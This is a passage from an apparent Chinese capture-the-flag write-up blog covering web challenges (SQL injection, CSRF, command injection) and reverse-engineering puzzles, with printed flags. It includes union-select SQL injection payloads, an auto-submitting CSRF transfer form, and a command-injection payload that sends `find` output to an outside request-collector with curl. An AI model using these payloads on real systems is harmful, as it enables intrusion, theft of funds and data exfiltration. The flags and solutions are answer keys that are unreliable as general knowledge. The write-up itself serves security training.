class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;123%23</span><br></pre></td></tr></table></figure><h3 id="带恶人六撞"><a href="#带恶人六撞" class="headerlink" title="带恶人六撞"></a>带恶人六撞</h3><h4 id="考点：SQL注入"><a href="#考点：SQL注入" class="headerlink" title="考点：SQL注入"></a>考点：SQL注入</h4><p>提示：</p><blockquote><p>你想了解带恶人六撞吗，数据库里有大家关于他的描述。</p></blockquote><p>首先判断类型：</p><p>测试后发现是一个单引号闭合字符串类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; or 1&#x3D;1 %23</span><br></pre></td></tr></table></figure><p>没什么好说的了，开始注入，先判断一波回显位数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; order by 4 %23&#x2F;&#x2F;回显位为四位</span><br></pre></td></tr></table></figure><p>获取库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,2,3,database() %23</span><br></pre></td></tr></table></figure><p>获取表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;geek_sql&quot; %23</span><br></pre></td></tr></table></figure><p>获取字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;fllllag&quot;%23</span><br><span class="line">id,fllllllag</span><br></pre></td></tr></table></figure><p>获取值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,2,3,group_concat(id,&#39;:&#39;,fllllllag) from fllllag %23</span><br></pre></td></tr></table></figure><h3 id="flagshop"><a href="#flagshop" class="headerlink" title="flagshop"></a>flagshop</h3><h4 id="考点：CSRF攻击"><a href="#考点：CSRF攻击" class="headerlink" title="考点：CSRF攻击"></a>考点：CSRF攻击</h4><p>这道题提示我们需要在页面里搞到钱，买到flag，关键点就是<strong>钱从哪来</strong>？</p><p>让我们现再仔细观察一下页面，我们每一个账号都有一个身份id，注册用户的身份是一个普通的用户</p><p>在主页里我们可以看到一个财务管理员的id：==Longlong==（待会我们会用到这个ID），如果搞到他的账户登录，或者让他打钱给我们我们不就有钱了，因为我们可以看到一个<strong>转账的页面</strong></p><p>题目的提示也验证了我们的猜想，而且但也堵上了第一条路</p><blockquote><p>1.No sessionid!Don’t Try to be admin(robot?) 2.Do you know csrf?</p><p>1.没有sessionid！不要尝试成为管理员（机器人？）2.您知道csrf吗？</p></blockquote><p><strong>我们先了解一下CSRF</strong></p><blockquote><p>是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，<strong>XSS</strong> 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任</p><p>跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了web中用户身份验证的一个漏洞：<strong>简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的</strong>。</p></blockquote><p>总结一下我们的攻击手段，我们需要挟制一个有钱的用户，让他打钱到我们的账户中，这样我们就有钱买flag了</p><p><strong>现在就是实现的步骤了：</strong></p><ol><li>我们需要写一个跨站脚本，来伪造一份转账记录</li><li>我们需要选择一个受害账户，让他来运行我们的脚本</li></ol><p>我们先来看一看一个<strong>正常的转账数据包</strong>长什么样子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;transfer.php HTTP&#x2F;1.1</span><br><span class="line">Host: 173.82.206.142:8005</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko&#x2F;20100101 Firefox&#x2F;81.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------41269904543009196447964679449</span><br><span class="line">Content-Length: 402</span><br><span class="line">Origin: http:&#x2F;&#x2F;173.82.206.142:8005</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;173.82.206.142:8005&#x2F;transfer.php</span><br><span class="line">Cookie: PHPSESSID&#x3D;95912f409b60a14797aa6d00f05471c1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------41269904543009196447964679449</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;target&quot;</span><br><span class="line"></span><br><span class="line">q</span><br><span class="line">-----------------------------41269904543009196447964679449</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;money&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------41269904543009196447964679449</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;messages&quot;</span><br><span class="line"></span><br><span class="line">emmm</span><br><span class="line">-----------------------------41269904543009196447964679449--</span><br></pre></td></tr></table></figure><p>头部信息是一个正常的信息，我们需要记住<strong>URL地址</strong></p><p>下面的文件信息倒是之前没有见到过，这个是一个特殊的POST提交</p><blockquote><p>POST 几种请求主要包括 application/x-www-form-urlencoded、 multipart/form-data、application/json、text/xml 四种的方法</p><p>1、application/x-www-form-urlencoded (默认常用)</p><p>​    最常见的 POST 提交数据的方式</p><p>2、multipart/form-data</p><p>​    令一个常见的 POST 数据提交的方式。<strong>我们使用表单上传文件时</strong>，必须让 表单的 enctyped等于 multipart/form-data</p><p>这个就是我们这次的POST提交方式了</p><p>3、application/json</p><p>​    这种方案，可以方便的<strong>提交复杂的结构化数据</strong>，这种POST提交方式越来越多，用来告诉服务端消息主体是序列化后的 JSON 字符串</p><p>4、text/xml</p><p>​    现在基本不用</p></blockquote><p><strong>multipart/form-data</strong>：就是我们这一次用到的一种POST提交方式了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;http://173.82.206.142:8005/transfer.php&quot;</span> method=post enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;target&quot; class=&quot;form-control form-control-line&quot; value=&#x27;e&#x27;&gt;</span><br><span class="line">    <span class="comment">//第一个input就是提交我们的转账对象，这里就是我们自己的账户了</span></span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;money&quot; class=&quot;form-control form-control-line&quot; value=&#x27;10000000000000000000&#x27;&gt;</span><br><span class="line">    <span class="comment">//第一个input是转账的金额</span></span><br><span class="line">&lt;input type=&quot;submit&quot; class=&quot;btn btn-success&quot; value=&quot;转账&quot;&gt;</span><br><span class="line">    <span class="comment">//提交按钮，我们要保证数据包的完整，下面的也是</span></span><br><span class="line">&lt;textarea rows=&quot;5&quot; name=&quot;messages&quot; class=&quot;form-control form-control-line&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;document.forms[<span class="number">0</span>].submit();&lt;/script&gt;<span class="comment">//这个就是写一个js自动提交，当点到这个php页面的时候，自动进行提交</span></span><br></pre></td></tr></table></figure><p>ok，已经完成了一半了，现在需要找到一个用户，让他去点击我们的这个页面</p><p>我们看到报告页面，这里有一个用户反馈页面，我们观察到其中一条</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-flagshop.png" alt="2020极客大挑战-flagshop"></p><p>我们可以提交一个报告，这个Longlong会去点击报告里的链接，这样我们就可以挟制他给我们打钱了</p><p>但我们在提交报告时遇到了一个问题，这个验证码填什么</p><blockquote><p>md5($code)[0:5] == d93b5</p></blockquote><p>写一个脚本吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5value</span>(<span class="params">s</span>):</span>  <span class="comment"># md5加密函数</span></span><br><span class="line">    md5 = hashlib.md5()  <span class="comment"># 获取一个md5加密算法对象</span></span><br><span class="line">    md5.update(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment"># 指定需要加密的字符串</span></span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()  <span class="comment"># 获取加密后的16进制字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">if</span> md5value(<span class="built_in">str</span>(i))[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">&quot;d93b5&quot;</span>:<span class="comment">#填入值</span></span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ok，我们只需要将PHP文件部署再自己的服务器上，再报告提交链接就可以了，成功买到flag</p><h3 id="知X堂的php教程"><a href="#知X堂的php教程" class="headerlink" title="知X堂的php教程"></a>知X堂的php教程</h3><h4 id="考点：代码执行"><a href="#考点：代码执行" class="headerlink" title="考点：代码执行"></a>考点：代码执行</h4><p>提示：</p><blockquote><p>知X堂（PS:请勿对号入座）的php教程开课啦！ん？好像不太对劲？</p><p>注意查看当前目录和文件名</p></blockquote><p>进入后，点击教案进入一个目录，这里的文件名为：<strong>listdir.php</strong></p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E7%9F%A5x%E5%A0%821.png" alt="2020极客大挑战-知x堂"></p><p>进入flag.php，发现url是<strong>phpfile=**，而且后面直接带了一个文件就能打开查看内容了，而且页面提示看目录文件，于是更改为</strong>listdir.php**就可以看到内容了</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E7%9F%A5x%E5%A0%822.png" alt="2020极客大挑战-知x堂"></p><p>文件打开后可以看到目录页面下的源代码了</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E7%9F%A5x%E5%A0%823.png" alt="2020极客大挑战-知x堂"></p><p><strong>注意：</strong> </p><p>这个目录界面有个$_GET[‘dirname’]参数被传进去，而且直接放到了exec()中，我们都知道exec()允许执行一个外部程序</p><p>同时，这里还引用了一个waf.php，那我们再看一下这个waf</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E7%9F%A5x%E5%A0%824.png" alt="2020极客大挑战-知x堂"></p><p>这个waf里面设置了过滤</p><p><strong>总结一下，我们可以利用dirname参数来进行代码执行，需要绕过一些东西</strong></p><p>我们可以尝试注入代码，可是没有回显</p><p>这里推荐使用一个在线网站，<a href="http://requestbin.net/">对URL分析收集对其发出的请求</a></p><p>原理是让靶机访问这个url，这个网站会对靶机的请求包做一个分析，同时返回给我们一个数据</p><p>这就是我们最后的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;listdir.php?dirname&#x3D;; curl http:&#x2F;&#x2F;requestbin.net&#x2F;r&#x2F;wo949nwo?inspect&#x3D;&#96;find &#x2F; -name &#39;flag&#39;&#96;</span><br></pre></td></tr></table></figure><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E7%9F%A5x%E5%A0%825.png" alt="2020极客大挑战-知x堂"></p><p>找到了路径，直接拿去打开就好了</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E7%9F%A5x%E5%A0%826.png" alt="2020极客大挑战-知x堂"></p><h3 id="忏悔的刘壮"><a href="#忏悔的刘壮" class="headerlink" title="忏悔的刘壮"></a>忏悔的刘壮</h3><h4 id="考点：python脚本编写"><a href="#考点：python脚本编写" class="headerlink" title="考点：python脚本编写"></a>考点：python脚本编写</h4><p>提示：</p><blockquote><p>刘壮天天干坏事，这次终于让我逮到他在python教堂忏悔了</p></blockquote><p>让我们回答一个随机答案，每忏悔一次成功就记录一次，需要我们一直忏悔20次，但给我们的时间只有3秒，所以我们只能写脚本来忏悔，需要带上上一次的cookie</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_func</span>(<span class="params">req</span>):</span></span><br><span class="line">    cookie_new = requests.utils.dict_from_cookiejar(req.cookies)</span><br><span class="line">    req = request.post(<span class="string">&quot;http://120.79.197.4:5000/check&quot;</span>,data=cookie_new)</span><br><span class="line">    result = req.text</span><br><span class="line">    print(result)</span><br><span class="line">    <span class="keyword">return</span> req</span><br><span class="line"></span><br><span class="line">request=requests.session()</span><br><span class="line">url = <span class="string">&quot;http://120.79.197.4:5000/&quot;</span></span><br><span class="line">req = request.get(url)</span><br><span class="line">cookie = requests.utils.dict_from_cookiejar(req.cookies)</span><br><span class="line">req2 = request.post(<span class="string">&quot;http://120.79.197.4:5000/check&quot;</span>,data=cookie)</span><br><span class="line">result = req2.text</span><br><span class="line">print(result)</span><br><span class="line">need_req = request_func(req2)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">20</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    need_req = request_func(req)</span><br></pre></td></tr></table></figure><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="No-RE-no-gain"><a href="#No-RE-no-gain" class="headerlink" title="No RE no gain"></a>No RE no gain</h3><h4 id="考点：IDA的使用"><a href="#考点：IDA的使用" class="headerlink" title="考点：IDA的使用"></a>考点：IDA的使用</h4><p>比较简单的re题目，里面有好多flag，但都不对，只有下面单独的是</p><blockquote><p>SYC{S4y_He11o_th3_RE_World!!!}</p></blockquote><h3 id="我真不会写驱动！"><a href="#我真不会写驱动！" class="headerlink" title="我真不会写驱动！"></a>我真不会写驱动！</h3><h4 id="考点：IDA的使用-1"><a href="#考点：IDA的使用-1" class="headerlink" title="考点：IDA的使用"></a>考点：IDA的使用</h4><p>比上面一题还简单，直接查找字符串就出来了</p><blockquote><p>SYC{First_Win64_DRIVER}</p></blockquote><h3 id="WhatsApk"><a href="#WhatsApk" class="headerlink" title="WhatsApk"></a>WhatsApk</h3><h4 id="考点：安卓逆向工具"><a href="#考点：安卓逆向工具" class="headerlink" title="考点：安卓逆向工具"></a>考点：安卓逆向工具</h4><p>我们要用到安卓逆向的工具，搜索flag就出来了</p><h3 id="re00"><a href="#re00" class="headerlink" title="re00"></a>re00</h3><h4 id="考点：异或加密"><a href="#考点：异或加密" class="headerlink" title="考点：异或加密"></a>考点：异或加密</h4><p>用IDA打开，进入主函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(buf) == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;nonono!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">char</span>)(buf[i] ^ <span class="number">0x44</span>) != byte_4060[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;wow, almost!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;yes! you get it!&quot;</span>);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  v1 = v4 &lt; *MK_FP(__FS__, <span class="number">40LL</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到，buf[i] ^ 0x44 进行异或，我们现在找到**byte_4060[i]**就可以写个python进行异或了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = [<span class="number">0x17</span>, <span class="number">0x1D</span>, <span class="number">0x07</span>, <span class="number">0x3F</span>, <span class="number">0x37</span>, <span class="number">0x2D</span>, <span class="number">0x29</span>, <span class="number">0x34</span>, <span class="number">0x28</span>, <span class="number">0x21</span>, <span class="number">0x1B</span>, <span class="number">0x37</span>, <span class="number">0x2D</span>, <span class="number">0x29</span>, <span class="number">0x34</span>, <span class="number">0x28</span>, <span class="number">0x21</span>, <span class="number">0x1B</span>, <span class="number">0x3C</span>, <span class="number">0x2B</span>, <span class="number">0x36</span>, <span class="number">0x36</span>, <span class="number">0x36</span>, <span class="number">0x1B</span>, <span class="number">0x36</span>, <span class="number">0x2D</span>, <span class="number">0x23</span>, <span class="number">0x2C</span>, <span class="number">0x30</span>, <span class="number">0x7B</span>, <span class="number">0x7B</span>, <span class="number">0x39</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">str</span>[i] ^ <span class="number">0x44</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><blockquote><p>SYC{simple_simple_xorrr_right??}</p></blockquote><h3 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h3><h4 id="考点：迷宫题"><a href="#考点：迷宫题" class="headerlink" title="考点：迷宫题"></a>考点：迷宫题</h4><p>用IDA打开，惯例找找字符串，在里面发现了一串很奇shj怪的—–和ooooo，进入后就是我们要的主函数</p><p>通过sh’j</p><p>逆向解出迷宫图，获得起始点和终点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">___________ooooo_____o________o</span><br><span class="line">_ooooooooo__ooo__ooo_oooooooooo</span><br><span class="line">_oooooooooo__o__oooo_oooooooooo</span><br><span class="line">________oooo___ooooo_oooooooooo</span><br><span class="line">ooooooo_oooooooooooo_oooooooooo</span><br><span class="line">ooooooo_ooooo_oooooo_oooooooooo</span><br><span class="line">ooooooo_ooooo_oooooo_oooooooooo</span><br><span class="line">S_______ooooo_oooooo__________E</span><br><span class="line">ooooooooooooooooooooooooooooooo</span><br></pre></td></tr></table></figure><p>flag就是路线，得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;dddddddwwwwaaaaaaawwwddddddddddsdsdsddwdwdwddddsssssssdddddddddd&#125;</span><br></pre></td></tr></table></figure><h3 id="Hello-NET"><a href="#Hello-NET" class="headerlink" title="Hello.NET"></a>Hello.NET</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">numArray=[<span class="number">18</span>,<span class="number">14</span>,<span class="number">40</span>,-<span class="number">14</span>,-<span class="number">2</span>,<span class="number">30</span>,<span class="number">10</span>,<span class="number">42</span>,<span class="number">35</span>,<span class="number">48</span>,<span class="number">43</span>,<span class="number">49</span>,<span class="number">52</span>,<span class="number">72</span>,<span class="number">57</span>,<span class="number">68</span>,<span class="number">86</span>,<span class="number">145</span>,<span class="number">115</span>,<span class="number">128</span>,<span class="number">115</span>,<span class="number">86</span>]</span><br><span class="line"><span class="built_in">list</span>=[<span class="number">101</span>,<span class="number">103</span>,<span class="number">107</span>,<span class="number">109</span>,<span class="number">113</span>,<span class="number">127</span>,<span class="number">131</span>,<span class="number">137</span>,<span class="number">139</span>,<span class="number">149</span>,<span class="number">151</span>,<span class="number">157</span>,<span class="number">163</span>,<span class="number">167</span>,<span class="number">173</span>,<span class="number">179</span>,<span class="number">181</span>,<span class="number">191</span>,<span class="number">193</span>,<span class="number">197</span>,<span class="number">199</span>,<span class="number">211</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">22</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">list</span>[i]-numArray[i])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="un-snake"><a href="#un-snake" class="headerlink" title="un_snake"></a>un_snake</h3><h4 id="考点：代码审计，pyc文件反编译"><a href="#考点：代码审计，pyc文件反编译" class="headerlink" title="考点：代码审计，pyc文件反编译"></a>考点：代码审计，pyc文件反编译</h4><p>题目给了一个pyc文件，这里我们需要准备一个python库，<strong>uncompyle6</strong>，可以直接将pyc文件反编译为py文件</p><blockquote><p>pyc文件同级目录下，cmd ：uncompyle6 -o pcat.py pcat.pyc</p></blockquote><p>接下来就是需要对代码进行审计了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 3.8 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.3 (tags/v3.8.3:6f8c832, May 13 2020, 22:37:02) [MSC v.1924 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: ./un_snake.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2020-08-05 16:20:40</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 1238 bytes</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> this</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre</span>(<span class="params">data</span>):</span></span><br><span class="line">    th1s = <span class="string">&#x27;TBESCFSRSAEUITANAIIN&#x27;</span>.encode()</span><br><span class="line">    <span class="keyword">if</span> (data_len := <span class="built_in">len</span>(data)) &gt; (th1s_len := <span class="built_in">len</span>(th1s)):</span><br><span class="line">        th1s = th1s * (data_len // th1s_len) + th1s[:data_len - th1s_len]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x ^ y, data, th1s))       <span class="comment"># data和th1s进行异或操作，返回2进制</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">plain</span>):</span></span><br><span class="line">    plain = <span class="built_in">list</span>(plain)</span><br><span class="line">    plain = plain[::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">        c = plain[i]</span><br><span class="line">        plain[i] = (c &lt;&lt; <span class="number">3</span> | c &gt;&gt; <span class="number">5</span>) &amp; <span class="number">255</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain) - <span class="number">1</span>):</span><br><span class="line">            plain[i] ^= plain[(i + <span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">bytes</span>(plain)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="keyword">return</span> b64encode(a) == <span class="string">b&#x27;mEiQCAjJoXJy2NiZQGGQyRm6IgHYQZAICKgowHHo4Dg=&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        stuff = <span class="built_in">input</span>(<span class="string">&#x27;Now input you flag:&#x27;</span>)</span><br><span class="line">        stuff_ready = pre(stuff.encode())</span><br><span class="line">        result = check(enc(stuff_ready))</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            print(<span class="string">&#x27;You get it! Python is so charming right?&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;Failed, try again!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;[🐍] Commit you flag, see you next 